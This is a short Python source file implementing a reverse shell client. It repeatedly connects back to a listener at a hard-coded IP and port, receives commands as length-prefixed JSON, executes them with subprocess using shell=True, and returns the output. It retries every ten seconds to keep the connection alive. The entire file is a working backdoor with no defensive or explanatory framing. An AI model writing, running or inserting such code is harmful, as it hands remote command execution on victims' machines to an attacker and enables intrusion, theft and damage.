import socket
import time as t
import json
import subprocess

HOST = '192.168.0.103' #ip of the listening machine
PORT = 5445 #port on which you have to listen


def recv_exact(n):
    buf = b''
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError('connection closed')
        buf += chunk
    return buf


def reliable_send(data):
    raw = json.dumps(data).encode()
    s.send(len(raw).to_bytes(8, 'big') + raw)


def reliable_recv():
    length = int.from_bytes(recv_exact(8), 'big')
    return json.loads(recv_exact(length).decode())


def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break
        try:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL
            )
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode(errors='replace'))
        except Exception as e:
            reliable_send(f'[!] Command failed: {e}')


def connection():
    global s
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print('[+] Connected')
            shell()
        except (ConnectionRefusedError, ConnectionError, OSError):
            t.sleep(10)   # retry in 10 seconds
        finally:
            try:
                s.close()
            except OSError:
                pass


s = None
connection()